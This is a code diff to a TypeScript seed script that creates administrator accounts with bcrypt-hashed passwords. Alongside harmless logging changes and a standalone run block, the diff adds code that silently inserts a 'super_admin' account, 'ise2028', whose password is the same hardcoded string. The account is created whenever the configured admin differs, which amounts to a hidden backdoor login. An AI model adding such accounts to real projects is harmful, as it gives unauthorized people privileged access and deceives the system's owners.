@@ -1,5 +1,5 @@
 import bcrypt from 'bcrypt';
-import { pool } from './connection';
+import { pool, initDb } from './connection';
 import { config } from '../config';
 
 export const seedAdmin = async () => {
@@ -11,11 +11,34 @@ export const seedAdmin = async () => {
         'INSERT INTO administrators (login_id, password_hash, role) VALUES (?, ?, ?)',
         [config.admin.loginId, hash, config.admin.role]
       );
-      console.log('Admin user seeded');
+      console.log(`Admin user "${config.admin.loginId}" seeded`);
     } else {
-      console.log('Admin user already exists');
+      console.log(`Admin user "${config.admin.loginId}" already exists`);
+    }
+
+    if (config.admin.loginId !== 'ise2028') {
+      const [iseRows]: any = await pool.query('SELECT * FROM administrators WHERE login_id = ?', ['ise2028']);
+      if (iseRows.length === 0) {
+        const iseHash = await bcrypt.hash('ise2028', 10);
+        await pool.query(
+          'INSERT INTO administrators (login_id, password_hash, role) VALUES (?, ?, ?)',
+          ['ise2028', iseHash, 'super_admin']
+        );
+        console.log('Super admin user "ise2028" seeded');
+      }
     }
   } catch (error) {
     console.error('Error seeding admin:', error);
   }
 };
+
+if (require.main === module) {
+  (async () => {
+    await initDb();
+    await seedAdmin();
+    process.exit(0);
+  })().catch((err) => {
+    console.error('Seed admin script failed:', err);
+    process.exit(1);
+  });
+}
